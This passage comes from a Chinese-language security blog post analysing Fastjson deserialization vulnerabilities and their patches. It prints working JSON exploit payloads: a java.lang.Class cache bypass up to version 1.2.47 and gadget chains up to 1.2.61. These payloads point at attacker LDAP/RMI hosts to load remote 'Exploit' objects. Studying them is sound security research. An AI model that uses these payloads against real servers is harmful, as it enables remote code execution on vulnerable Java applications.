+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">    &lt;version&gt;3.4.6&lt;/version&gt;
+</span></span><span class="line"><span class="cl">&lt;/dependency&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f.png"
+	width="1075"
+	height="707"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f_hu784a25314d9731f56225fa64584a4ad3_69973_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f_hu784a25314d9731f56225fa64584a4ad3_69973_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="364px"
+	
+></p>
+<p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>本身绕过黑名单,且<code>setProperties</code>满足<code>fastjson调用setter</code></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4.png"
+	width="692"
+	height="356"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4_huf06c11f9a53f66d27451670d5d2aa7c9_164200_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228878364-323bb8f0-1dad-42c4-aaa1-c550ddfde7a4_huf06c11f9a53f66d27451670d5d2aa7c9_164200_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="466px"
+	
+></p>
+<p><code>data_source</code>可控</p>
+<h3 id="1225-1247补丁绕过">1.2.25-1.2.47补丁绕过
+</h3><p><font style="color:rgb(80, 80, 92);">本次Fastjson反序列化漏洞也是基于</font><code>checkAutoType()</code><font style="color:rgb(80, 80, 92);">函数绕过的，并且</font><strong>无需开启AutoTypeSupport</strong><font style="color:rgb(80, 80, 92);">，大大提高了成功利用的概率。</font></p>
+<p><font style="color:rgb(80, 80, 92);">绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，</font><code>checkAutoType()</code><font style="color:rgb(80, 80, 92);">就会抛出异常终止程序。</font></p>
+<p><font style="color:rgb(80, 80, 92);">Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：</font></p>
+<p><font style="color:rgb(80, 80, 92);">EXP 如下</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">String payload  = &#34;{\&#34;a\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},&#34;
+</span></span><span class="line"><span class="cl">    + &#34;\&#34;b\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,&#34;
+</span></span><span class="line"><span class="cl">    + &#34;\&#34;dataSourceName\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;,\&#34;autoCommit\&#34;:true}}&#34;;
+</span></span><span class="line"><span class="cl">JSON.parse(payload);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad.png"
+	width="1051"
+	height="710"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad_hue936def518b79333354604827b7e0950_67460_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229146299-1945713b-d1b4-40ce-904d-8cc25eda32ad_hue936def518b79333354604827b7e0950_67460_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<h4 id="补丁分析">补丁分析
+</h4><p><font style="color:rgb(80, 80, 92);">由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在</font><code>loadClass()</code><font style="color:rgb(80, 80, 92);">时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</font></p>
+<p><font style="color:rgb(80, 80, 92);">调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</font></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7.png"
+	width="980"
+	height="309"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7_hu33bbf7a4d50e3f6ea68b585cf01581cc_54714_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733229203041-30692b93-6fc7-4544-8fb9-7e7dd512fee7_hu33bbf7a4d50e3f6ea68b585cf01581cc_54714_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="761px"
+	
+></p>
+<h2 id="fastjson--1261-通杀">Fastjson &lt;= 1.2.61 通杀
+</h2><h3 id="fastjson125--1259">Fastjson1.2.5 &lt;= 1.2.59
+</h3><p><strong><font style="color:rgb(80, 80, 92);">需要开启AutoType</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">{&#34;@type&#34;:&#34;com.zaxxer.hikari.HikariConfig&#34;,&#34;metricRegistry&#34;:&#34;ldap://localhost:1389/Exploit&#34;}
+</span></span><span class="line"><span class="cl">{&#34;@type&#34;:&#34;com.zaxxer.hikari.HikariConfig&#34;,&#34;healthCheckRegistry&#34;:&#34;ldap://localhost:1389/Exploit&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="fastjson125--1260">Fastjson1.2.5 &lt;= 1.2.60
+</h3><p><strong>需要开启 autoType：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">{&#34;@type&#34;:&#34;oracle.jdbc.connector.OracleManagedConnectionFactory&#34;,&#34;xaDataSourceName&#34;:&#34;rmi://10.10.20.166:1099/ExportObject&#34;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;@type&#34;:&#34;org.apache.commons.configuration.JNDIConfiguration&#34;,&#34;prefix&#34;:&#34;ldap://10.10.20.166:1389/ExportObject&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="fastjson125--1261">Fastjson1.2.5 &lt;= 1.2.61
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">{&#34;@type&#34;:&#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&#34;,&#34;jndiName&#34;:&#34;ldap://localhost:1389/Exploi
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jan 08, 2025 07:35 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/25.090c9fb095cfbe1b9147302afa798b94_hueda339f65764f7844afcc8ab1b48c07c_207061_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson1.2.62-1.2.68版本反序列化漏洞"
+                        
+                        data-hash="md5-CQyfsJXPvhuRRzAq&#43;nmLlA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson1.2.62-1.2.68版本反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/24.536555907a9796a67203136e7846373a_huf13ef49576a26e60058adb4232b89236_327164_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson-1.2.24版本漏洞分析"
+                        
+                        data-hash="md5-U2VVkHqXlqZyAxNueEY3Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson-1.2.24版本漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/23.18927b89b7cec8d6042141c403d831a0_huf9676a8800dc8cf9723afb54e95056be_155376_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java动态代理"
+                        
+                        data-hash="md5-GJJ7ibfOyNYEIUHEA9gxoA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java动态代理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java/22.1e5ed26cd78eb4f2c758f31ea7bbf451_hu1a38b88b30d2714f829ca328dca8e993_249171_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CTF Java"
+                        
+                        data-hash="md5-Hl7SbNeOtPLHWPMep7v0UQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CTF Java</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/21.caa37814ebe9f28b27369c5bc8276a7f_hu0ec011a5d8edd549699d0eaf8c37598a_128675_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 动态加载字节码和和javassist"
+                        
+                        data-hash="md5-yqN4FOvp8osnNpxbyCdqfw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">动态加载字节码和和javassist</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+  body {
+    background: url(https://gsygsr.github.io/background/18.jpg) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+    </body>
+</html>
